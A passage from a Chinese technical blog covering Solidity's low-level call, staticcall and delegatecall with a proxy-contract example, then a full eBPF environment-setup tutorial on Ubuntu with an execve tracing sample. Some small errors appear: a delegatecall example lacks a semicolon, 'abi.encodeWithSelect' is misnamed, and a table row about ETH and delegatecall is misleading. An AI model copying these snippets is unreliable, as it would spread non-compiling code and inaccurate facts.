       abi.encodeWithSignature(&quot;setValue(uint256)&quot;, value)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">        return (success, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEth(address payable target) external payable &#123;</span><br><span class="line">        // 使用 call 发送 ETH</span><br><span class="line">        (bool success, ) = target.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Send ETH failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="staticcall"><a href="#staticcall" class="headerlink" title="staticcall"></a>staticcall</h1><p><strong>功能</strong></p>
<p><code>staticcall</code>是一种只读调用方法，用于调用目标合约的视图或纯函数。它不允许改变状态，因此更安全且节省 Gas</p>
<p><strong>特点</strong></p>
<ul>
<li>只能调用 view 或 pure 修饰的函数。</li>
<li>无法修改状态或发送 ETH。</li>
<li>返回两个值：<ul>
<li>调用是否成功 (bool)。</li>
<li>调用返回的数据 (bytes memory)。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>查询目标合约的状态。</li>
<li>调用只读逻辑以避免状态改变。</li>
</ul>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract StaticCallExample &#123;</span><br><span class="line">    function staticCallFunction(address target) external view returns (uint256) &#123;</span><br><span class="line">        // 使用 staticcall 调用目标合约的 storedValue()</span><br><span class="line">        (bool success, bytes memory data) = target.staticcall(</span><br><span class="line">            abi.encodeWithSignature(&quot;storedValue()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Staticcall failed&quot;);</span><br><span class="line">        return abi.decode(data, (uint256));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h1><p><strong>功能</strong></p>
<p><code>delegatecall</code> 是一种在当前合约上下文中执行目标合约逻辑的方法。它会以调用合约的存储布局为准，执行目标合约中的代码。</p>
<p><strong>特点</strong></p>
<ul>
<li>使用调用合约的存储。</li>
<li>使用调用合约的 msg.sender 和 msg.value。</li>
<li>返回两个值：<ul>
<li>调用是否成功 (bool)。</li>
<li>调用返回的数据 (bytes memory)。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>实现合约代理（如升级逻辑）。</li>
<li>在共享存储布局的上下文中执行外部逻辑。</li>
</ul>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract DelegateCallExample &#123;</span><br><span class="line">    uint256 public storedValue;</span><br><span class="line"></span><br><span class="line">    function delegateCallFunction(address target, uint256 value) external &#123;</span><br><span class="line">        // 使用 delegatecall 调用目标合约的 setValue(uint)</span><br><span class="line">        (bool success, ) = target.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setValue(uint256)&quot;, value)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 被调用合约 (Library)</span><br><span class="line">contract Target &#123;</span><br><span class="line">    uint256 public storedValue;</span><br><span class="line"></span><br><span class="line">    function setValue(uint256 value) external &#123;</span><br><span class="line">        storedValue = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="call-VS-staticcall-VS-delegatecall"><a href="#call-VS-staticcall-VS-delegatecall" class="headerlink" title="call VS staticcall VS delegatecall"></a><code>call</code> VS <code>staticcall</code> VS <code>delegatecall</code></h1><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="center">call</th>
<th align="center">staticcall</th>
<th align="center">delegatecall</th>
</tr>
</thead>
<tbody><tr>
<td align="center">可读写状态</td>
<td align="center">✅</td>
<td align="center">❌（只读）</td>
<td align="center">✅</td>
</tr>
<tr>
<td align="center">使用调用合约存储</td>
<td align="center">❌</td>
<td align="center">❌</td>
<td align="center">✅</td>
</tr>
<tr>
<td align="center">使用调用合约<code>msg.sender</code></td>
<td align="center">❌</td>
<td align="center">❌</td>
<td align="center">✅</td>
</tr>
<tr>
<td align="center">支持发送ETH</td>
<td align="center">✅</td>
<td align="center">❌</td>
<td align="center">❌</td>
</tr>
<tr>
<td align="center">调用不存在的函数</td>
<td align="center">支持，返回失败</td>
<td align="center">支持，返回失败</td>
<td align="center">支持，返回失败</td>
</tr>
</tbody></table>
<h1 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h1><p><strong>call 的安全性</strong></p>
<ul>
<li>使用 call 调用外部合约时，目标合约可能会执行恶意代码。需要额外检查返回值并限制权限。</li>
<li>不要轻易使用 call 调用不可信的合约。</li>
</ul>
<p><strong>delegatecall 的存储风险</strong></p>
<ul>
<li>调用目标合约时，目标合约必须与调用合约共享相同的存储布局，否则可能导致存储冲突。</li>
<li>使用 delegatecall 需要确保调用的是受信任的逻辑。</li>
</ul>
<p><strong>Gas 消耗与返回值处理</strong></p>
<ul>
<li>注意低级调用的 Gas 使用，避免由于 Gas 不足导致调用失败。</li>
<li>低级调用（call、staticcall 和 delegatecall）不会自动抛出异常，需要手动处理返回值。</li>
</ul>
<p><strong>不要使用简写类型</strong></p>
<p>无论是使用abi.encodeWithSelect 还是 abi.encodeWithSignature ，参数中方法名后的参数一定不要使用简写类型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 错误写法</span><br><span class="line">(bool success, ) = target.call(abi.encodeWithSignature(&quot;setValue(uint)&quot;, value));</span><br></pre></td></tr></table></figure>

<p>因为在编译的过程中，编译器会将简写类型（如：uint）转换成uint256，这将导致，你的签名或选择器不匹配，导致执行失败。</p>
<h1 id="实践案例：实现代理合约"><a href="#实践案例：实现代理合约" class="headerlink" title="实践案例：实现代理合约"></a>实践案例：实现代理合约</h1><p>以下是使用 <code>delegatecall</code> 的代理合约的示例，用于实现合约逻辑的动态升级</p>
<p><strong>代码示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 逻辑合约</span><br><span class="line">contract LogicContract &#123;</span><br><span class="line">    uint256 public storedValue;</span><br><span class="line"></span><br><span class="line">    function setValue(uint256 value) external &#123;</span><br><span class="line">        storedValue = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 代理合约</span><br><span class="line">contract ProxyContract &#123;</span><br><span class="line">    address public logicContract;</span><br><span class="line"></span><br><span class="line">    constructor(address _logicContract) &#123;</span><br><span class="line">        logicContract = _logicContract;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        (bool success, ) = logicContract.delegatecall(msg.data);</span><br><span class="line">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行过程</strong></p>
<ul>
<li>部署 LogicContract。</li>
<li>部署 ProxyContract，将 LogicContract 的地址传递给其构造函数。</li>
<li>通过代理合约调用 setValue 方法，storedValue 实际存储在 ProxyContract 中</li>
</ul>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><code>call</code>、<code>staticcall</code> 和 <code>delegatecall</code> 是 Solidity 中的基础工具，可以用来实现灵活的合约交互和逻辑扩展。在使用这些低级调用时，需要仔细处理返回值、安全性以及存储一致性问题。</p>
<p>通过合理使用这些工具，您可以设计功能强大且可扩展的智能合约体系，同时避免潜在的安全漏洞。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2024/05/24/linux/ebpf-deploy-sample/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/24/linux/ebpf-deploy-sample/" class="post-title-link" itemprop="url">eBPF开发环境搭建及示例</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-24 14:10:59" itemprop="dateCreated datePublished" datetime="2024-05-24T14:10:59+08:00">2024-05-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-09 15:57:18" itemprop="dateModified" datetime="2024-09-09T15:57:18+08:00">2024-09-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 22.04.4 LTS</span><br><span class="line">Release:	22.04</span><br><span class="line">Codename:	jammy</span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line">Linux ubu22 5.15.0-100-generic <span class="comment">#110-Ubuntu SMP Wed Feb 7 13:28:04 UTC 2024 aarch64 aarch64 aarch64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<h1 id="包安装"><a href="#包安装" class="headerlink" title="包安装"></a>包安装</h1><p><em>安装软件包</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y bison flex build-essential git cmake make libelf-dev strace tar libfl-dev libssl-dev libedit-dev zlib1g-dev  python  python3-distutils libcap-dev llvm clang</span><br></pre></td></tr></table></figure>

<h2 id="安装-bcc"><a href="#安装-bcc" class="headerlink" title="安装 bcc"></a>安装 bcc</h2><p><code>bcc</code> 是一组用于 <code>eBPF</code> 开发的工具，它包括了一组用于编写和调试 <code>eBPF</code> 程序的库和命令行工具。使用 <code>bcc</code>，可以更加方便地开发和调试 <code>eBPF</code> 程序，提高开发效率和代码质量。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install bpfcc-tools</span><br></pre></td></tr></table></figure>

<h2 id="安装-bpftool"><a href="#安装-bpftool" class="headerlink" title="安装 bpftool"></a>安装 bpftool</h2><p><code>bpftool</code> 是一个用于管理和调试 <code>eBPF</code> 代码的命令行工具。它允许你查看和分析系统中运行的 <code>eBPF</code> 程序和映射，以及与内核中的 <code>eBPF</code> 子系统进行交互。更多内容可以查看 <a target="_blank" rel="noopener" href="https://github.com/libbpf/bpftool">bpftool Github</a></p>
<p>使用 <code>bpftool</code>，你可以执行以下操作：</p>
<ul>
<li>列出当前系统中所有加载的 <code>eBPF</code> 程序和映射</li>
<li>查看指定 <code>eBPF</code> 程序或映射的详细信息，例如指令集、内存布局等</li>
<li>修改 <code>eBPF</code> 程序或映射的属性，例如禁用一个程序或清空一个映射</li>
<li>将一个 <code>eBPF</code> 程序或映射导出到文件中，以便在其他系统上重新导入</li>
<li>调试 <code>eBPF</code> 程序，例如跟踪程序的控制流、访问内存等</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y linux-tools-$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure>

<p>默认情况下 <code>bpftool</code> 命令会安装到&#x2F;<code>usr/local/sbin/</code> 下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bpftool version -p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;5.15.143&quot;</span>,</span><br><span class="line">    <span class="string">&quot;features&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;libbfd&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;skeletons&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="安装linux源码"><a href="#安装linux源码" class="headerlink" title="安装linux源码"></a>安装linux源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-source-5.15.0</span><br></pre></td></tr></table></figure>

<h1 id="编译bpf-sample"><a href="#编译bpf-sample" class="headerlink" title="编译bpf sample"></a>编译bpf sample</h1><p><em>解压缩</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/src/linux-source-5.15.0/debian</span><br><span class="line">tar -jxvf linux-source-5.15.0.tar.bz2</span><br></pre></td></tr></table></figure>

<p><em>Copy config文件</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-source-5.15.0</span><br><span class="line"><span class="built_in">cp</span> -v /boot/config-$(<span class="built_in">uname</span> -r) .config</span><br><span class="line">make oldconfig &amp;&amp; make prepare</span><br></pre></td></tr></table></figure>


<p><em>编译Samples</em></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -C samples/bpf</span><br></pre></td></tr></table></figure>

<p>若遇到如下错误</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  CC      /usr/src/linux-source-5.15.0/samples/bpf/bpftool/prog.o</span><br><span class="line">  LINK    /usr/src/linux-source-5.15.0/samples/bpf/bpftool/bpftool</span><br><span class="line">/usr/src/linux-source-5.15.0/samples/bpf/Makefile:369: *** Cannot find a vmlinux <span class="keyword">for</span> VMLINUX_BTF at any of <span class="string">&quot;  /usr/src/linux-source-5.15.0/vmlinux&quot;</span>, build the kernel or <span class="built_in">set</span> VMLINUX_BTF or VMLINUX_H variable.  Stop.</span><br><span class="line">make[1]: *** [Makefile:1911: /usr/src/linux-source-5.15.0/samples/bpf] Error 2</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-source-5.15.0&#x27;</span></span><br><span class="line">make: *** [Makefile:275: all] Error 2</span><br><span class="line">make: Leaving directory <span class="string">&#x27;/usr/src/linux-source-5.15.0/samples/bpf&#x27;</span></span><br></pre></td></tr></table></figure>

<p>说明需要 vmlinux，可以指定vmlinux再进行编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make VMLINUX_BTF=/sys/kernel/btf/vmlinux -C samples/bpf</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make VMLINUX_BTF=/sys/kernel/btf/vmlinux M=samples/bpf</span><br></pre></td></tr></table></figure>

<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>示例需要在 <code>usr/src/linux-source-5.15.0/samples/bpf</code>目录下进行编译。<code>samples/bpf</code> 下的程序一般组成方式是 xxx_user.c 和 xxx_kern.c</p>
<ul>
<li>xxx_user.c：为用户空间的程序用于设置 BPF 程序的相关配置、加载 BPF 程序至内核、设置 BPF 程序中的 map 值和读取 BPF 程序运行过程中发送至用户空间的消息等。</li>
<li>xxx_kern.c：为 BPF 程序代码，通过 clang 编译成字节码加载至内核中，在对应事件触发的时候运行，可以接受用户空间程序发送的各种数据，并将运行时产生的数据发送至用户空间程序。</li>
</ul>
<p>新建两个文件：<code>bob_user.c</code>和<code>bob_kern.c</code></p>
<p><em>bob_kern.c</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_tracing.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">&quot;tracepoint/syscalls/sys_enter_execve&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_prog</span><span class="params">(<span class="keyword">struct</span> pt_regs *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> fmt[] = <span class="string">&quot;bob %s !\n&quot;</span>;</span><br><span class="line">	<span class="type">char</span> comm[<span class="number">16</span>];</span><br><span class="line">	bpf_get_current_comm(&amp;comm, <span class="keyword">sizeof</span>(comm));</span><br><span class="line">	bpf_trace_printk(fmt, <span class="keyword">sizeof</span>(fmt), comm);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> _license[] SEC(<span class="string">&quot;license&quot;</span>) = <span class="string">&quot;GPL&quot;</span>;</span><br><span class="line">u32 _version <span class="title function_">SEC</span><span class="params">(<span class="string">&quot;version&quot;</span>)</span> = LINUX_VERSION_CODE;</span><br></pre></td></tr></table></figure>

<p><em>bob_user.c</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/libbpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;trace_helpers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> ac, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_link</span> *<span class="title">link</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> *<span class="title">prog</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_object</span> *<span class="title">obj</span>;</span></span><br><span class="line">	<span class="type">char</span> filename[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">&quot;%s_kern.o&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	obj = bpf_object__open_file(filename, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (libbpf_get_error(obj)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: opening BPF object file failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	prog = bpf_object__find_program_by_name(obj, <span class="string">&quot;bpf_prog&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!prog) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: finding a prog in obj file failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* load BPF program */</span></span><br><span class="line">	<span class="keyword">if</span> (bpf_object__load(obj)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: loading BPF object file failed\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	link = bpf_program__attach(prog);</span><br><span class="line">	<span class="keyword">if</span> (libbpf_get_error(link)) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: bpf_program__attach failed\n&quot;</span>);</span><br><span class="line">		link = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">goto</span> cleanup;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	read_trace_pipe();</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">	bpf_link__destroy(link);</span><br><span class="line">	bpf_object__close(obj);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改 <code>samples/bpf/Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">tprogs-y += xdp_sample_pkts</span><br><span class="line">tprogs-y += ibumad</span><br><span class="line">tprogs-y += hbm</span><br><span class="line"><span class="comment"># 增加 user programs</span></span><br><span class="line">tprogs-y += bob</span><br><span class="line">...</span><br><span class="line">ibumad-objs := ibumad_user.o</span><br><span class="line">hbm-objs := hbm.o <span class="variable">$(CGROUP_HELPERS)</span></span><br><span class="line"><span class="comment"># 增加 objs</span></span><br><span class="line">bob-objs := bob_user.o <span class="variable">$(TRACE_HELPERS)</span></span><br><span class="line">...</span><br><span class="line">always-y += hbm_edt_kern.o</span><br><span class="line">always-y += xdpsock_kern.o</span><br><span class="line"><span class="comment"># 增加 kernel programs</span></span><br><span class="line">always-y += bob_kern.o</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make VMLINUX_BTF=/sys/kernel/btf/vmlinux M=samples/bpf</span><br></pre></td></tr></table></figure>


<p>运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd samples/bpf</span></span><br><span class="line"><span class="comment"># ./bob</span></span><br><span class="line">libbpf: elf: skipping unrecognized data section(4) .rodata.str1.1</span><br><span class="line">           &lt;...&gt;-3622529 [001] d...1 1751426.283602: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            sshd-3622530 [001] d...1 1751426.288591: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            sshd-3622531 [001] d...1 1751430.924951: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &lt;...&gt;-3622532 [000] d...1 1751430.929273: bpf_trace_printk: bob sshd !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            bash-3622532 [000] d...1 1751430.930114: bpf_trace_printk: bob bash !</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &lt;...&gt;-3622533 [001] d...1 1751430.934470: bpf_trace_printk: bob sshd !</span><br></pre></td></tr></table></figure>


<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lizhijun_buaa/article/details/131644323">eBPF开发环境搭建</a></li>
<li><a target="_blank" rel="noopener" href="https://yaoyao.io/posts/how-to-setup-ebpf-env-on-ubuntu#linux-tools">如何在 Ubuntu 上配置 eBPF 开发环境</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/baidu_29900103/article/details/131188347">基于ubuntu22.04-深入浅出 eBPF</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://zhoubofsy.github.io/2023/02/16/storage/linux-drbd-usage/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="博">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Bolog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/16/storage/linux-drbd-usage/" class="post-title-link" itemprop="url">DRBD</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
